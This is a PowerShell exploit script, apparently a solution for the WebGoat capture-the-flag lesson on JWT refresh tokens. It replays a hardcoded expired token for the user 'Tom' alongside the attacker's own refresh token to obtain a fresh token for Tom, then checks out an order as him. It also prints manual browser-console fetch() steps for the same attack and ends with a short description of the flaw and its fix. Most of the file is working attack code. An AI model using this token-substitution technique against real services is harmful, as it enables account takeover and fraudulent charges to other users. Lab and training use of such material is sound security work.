################################################
# JWT Refresh Token Manipulation Attack
# Challenge: Make Tom pay for the books
################################################

param(
    [string]$BaseUrl = "http://192.168.254.112:8001/WebGoat"
)

Write-Host "================================================" -ForegroundColor Cyan
Write-Host "   JWT Refresh Token Attack" -ForegroundColor Yellow
Write-Host "   Target: Make Tom pay for our order" -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Cyan

# Extract Tom's expired token from the log
$tomsExpiredToken = "eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q"

Write-Host "`nStep 1: Analyzing Tom's expired token from log..." -ForegroundColor Cyan

# Decode the token to see the payload
$parts = $tomsExpiredToken -split '\.'
$payload = $parts[1]
$payload += '=' * ((4 - ($payload.Length % 4)) % 4)
$payloadJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))

Write-Host "Tom's Token Payload:" -ForegroundColor Yellow
$payloadJson | ConvertFrom-Json | ConvertTo-Json
Write-Host "Status: EXPIRED ❌" -ForegroundColor Red

Write-Host "`n================================================" -ForegroundColor Cyan
Write-Host "   Step 2: Adding items to cart" -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Cyan

# First, we need to be logged in to get our own tokens
Write-Host "Logging in as our user..." -ForegroundColor Yellow

try {
    # Login to get our own tokens
    $loginBody = @{
        username = "webgoat"
        password = "webgoat"
    } | ConvertTo-Json

    $loginResponse = Invoke-WebRequest -Uri "$BaseUrl/login" -Method POST `
        -ContentType "application/json" `
        -Body $loginBody `
        -SessionVariable session `
        -ErrorAction Stop

    Write-Host "✓ Login successful" -ForegroundColor Green
    
    # Parse the response to get tokens
    $loginData = $loginResponse.Content | ConvertFrom-Json
    $ourAccessToken = $loginData.access_token
    $ourRefreshToken = $loginData.refresh_token
    
    Write-Host "`nOur Access Token: $($ourAccessToken.Substring(0,20))..." -ForegroundColor Yellow
    Write-Host "Our Refresh Token: $($ourRefreshToken.Substring(0,20))..." -ForegroundColor Yellow

} catch {
    Write-Host "❌ Login failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Trying to get tokens from current session..." -ForegroundColor Yellow
}

Write-Host "`n================================================" -ForegroundColor Cyan
Write-Host "   Step 3: The Attack - Refresh Token Manipulation" -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Cyan

Write-Host @"

Attack Strategy:
1. Use Tom's EXPIRED access token in Authorization header
2. Use OUR refresh token in the body
3. Server validates refresh token (ours - valid ✓)
4. Server doesn't check if access token matches refresh token ❌
5. Server issues NEW access token for Tom!

This is a refresh token manipulation vulnerability.

"@ -ForegroundColor Cyan

# Try to get a new token for Tom using the vulnerability
Write-Host "Attempting to refresh Tom's token with our refresh token..." -ForegroundColor Yellow

try {
    # Method 1: Try with refresh endpoint
    $headers = @{
        "Authorization" = "Bearer $tomsExpiredToken"
        "Content-Type" = "application/json"
    }
    
    $refreshBody = @{
        refresh_token = $ourRefreshToken
    } | ConvertTo-Json

    Write-Host "`nSending request to: $BaseUrl/JWT/refresh/newToken" -ForegroundColor Yellow
    Write-Host "Authorization: Bearer <Tom's expired token>" -ForegroundColor Gray
    Write-Host "Body: { refresh_token: <our refresh token> }" -ForegroundColor Gray

    $refreshResponse = Invoke-WebRequest -Uri "$BaseUrl/JWT/refresh/newToken" `
        -Method POST `
        -Headers $headers `
        -Body $refreshBody `
        -ErrorAction Stop

    Write-Host "`n✅ SUCCESS! Got new token for Tom!" -ForegroundColor Green
    
    $newTokenData = $refreshResponse.Content | ConvertFrom-Json
    $tomsNewToken = $newTokenData.access_token
    
    Write-Host "`nTom's NEW Access Token:" -ForegroundColor Green
    Write-Host $tomsNewToken -ForegroundColor Cyan

    # Decode the new token
    $newParts = $tomsNewToken -split '\.'
    $newPayload = $newParts[1]
    $newPayload += '=' * ((4 - ($newPayload.Length % 4)) % 4)
    $newPayloadJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($newPayload))
    
    Write-Host "`nNew Token Payload:" -ForegroundColor Yellow
    $newPayloadJson | ConvertFrom-Json | ConvertTo-Json
    
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "   Step 4: Checkout as Tom" -ForegroundColor Yellow
    Write-Host "================================================" -ForegroundColor Cyan
    
    # Now use Tom's new token to checkout
    $checkoutHeaders = @{
        "Authorization" = "Bearer $tomsNewToken"
        "Content-Type" = "application/json"
    }
    
    Write-Host "Proceeding to checkout with Tom's token..." -ForegroundColor Yellow
    
    $checkoutResponse = Invoke-WebRequest -Uri "$BaseUrl/JWT/refresh/checkout" `
        -Method POST `
        -Headers $checkoutHeaders `
        -ErrorAction Stop
    
    Write-Host "`n✅ CHALLENGE COMPLETE!" -ForegroundColor Green
    Write-Host "Tom is paying for the books! 💰" -ForegroundColor Green
    
    Write-Host "`nCheckout Response:" -ForegroundColor Yellow
    Write-Host $checkoutResponse.Content
    
    # Copy the token to clipboard for manual submission
    Set-Clipboard $tomsNewToken
    Write-Host "`n✅ Tom's token copied to clipboard!" -ForegroundColor Green

} catch {
    Write-Host "`n❌ Request failed: $($_.Exception.Message)" -ForegroundColor Red
    
    if ($_.Exception.Response) {
        $reader = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
        $responseBody = $reader.ReadToEnd()
        Write-Host "Response: $responseBody" -ForegroundColor Yellow
    }
    
    Write-Host "`n================================================" -ForegroundColor Yellow
    Write-Host "   Manual Attack Steps" -ForegroundColor Yellow
    Write-Host "================================================" -ForegroundColor Yellow
    
    Write-Host @"

If automated attack failed, try manually:

1. Open Browser DevTools (F12) → Console

2. First, login and get YOUR tokens:
   fetch('$BaseUrl/login', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({username: 'webgoat', password: 'webgoat'})
   }).then(r => r.json()).then(data => {
     window.myRefreshToken = data.refresh_token;
     console.log('Your refresh token:', data.refresh_token);
   });

3. Then, use Tom's expired token + your refresh token:
   fetch('$BaseUrl/JWT/refresh/newToken', {
     method: 'POST',
     headers: {
       'Authorization': 'Bearer $tomsExpiredToken',
       'Content-Type': 'application/json'
     },
     body: JSON.stringify({refresh_token: window.myRefreshToken})
   }).then(r => r.json()).then(data => {
     window.tomsNewToken = data.access_token;
     console.log('Tom\'s new token:', data.access_token);
   });

4. Finally, checkout with Tom's new token:
   fetch('$BaseUrl/JWT/refresh/checkout', {
     method: 'POST',
     headers: {
       'Authorization': 'Bearer ' + window.tomsNewToken,
       'Content-Type': 'application/json'
     }
   }).then(r => r.json()).then(data => {
     console.log('Success!', data);
   });

"@ -ForegroundColor Cyan
}

Write-Host "`n================================================" -ForegroundColor Cyan
Write-Host "   Attack Summary" -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Cyan

Write-Host @"

Vulnerability: Refresh Token Manipulation
-----------------------------------------
The server validates the refresh token but doesn't check
if it belongs to the user in the expired access token.

Attack Flow:
1. Tom's expired access token (from log) → Contains user='Tom'
2. Our valid refresh token → Belongs to us
3. Server sees valid refresh token → Issues new token
4. BUT: New token is for Tom (from the access token)!
5. We can now act as Tom and make him pay!

Fix: Server must verify that the refresh token belongs 
     to the same user as the access token.

"@ -ForegroundColor White

Write-Host "================================================" -ForegroundColor Green
Write-Host "   Attack Complete!" -ForegroundColor Green
Write-Host "================================================" -ForegroundColor Green
